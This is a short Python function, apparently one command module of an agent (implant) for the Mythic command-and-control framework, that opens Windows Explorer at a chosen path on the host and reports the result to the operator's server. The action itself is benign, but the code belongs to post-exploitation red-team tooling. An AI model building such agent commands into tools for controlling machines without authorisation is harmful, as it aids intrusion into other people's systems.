import os
import json

def open_explorer(self, task_id, path=None):
    """
    Abre o Explorador de Arquivos (Windows Explorer) em um diretório especificado ou no diretório atual do agente.
    
    Args:
        task_id (str): ID da tarefa enviada pelo Mythic.
        path (str, optional): Caminho do diretório a ser aberto. Se None, usa o diretório atual.
    
    Returns:
        str: JSON com o resultado da operação (sucesso ou erro).
    """
    try:
        if path:
            # Normaliza o caminho para garantir que seja válido
            full_path = os.path.abspath(path) if os.path.exists(path) else os.path.abspath(os.path.join(self.current_directory, path))
            if os.path.exists(full_path):
                os.startfile(full_path)
                output = f"Opened Explorer at {full_path}"
            else:
                output = f"Path {full_path} does not exist"
        else:
            # Abre o Explorer no diretório atual
            os.startfile(self.current_directory)
            output = f"Opened Explorer at {self.current_directory}"

        # Envia a atualização da tarefa para o Mythic
        self.sendTaskOutputUpdate(task_id, output)
        return json.dumps({"status": "success", "output": output})

    except Exception as e:
        error_msg = f"Failed to open Explorer: {str(e)}"
        self.sendTaskOutputUpdate(task_id, error_msg)
        return json.dumps({"status": "error", "output": error_msg})
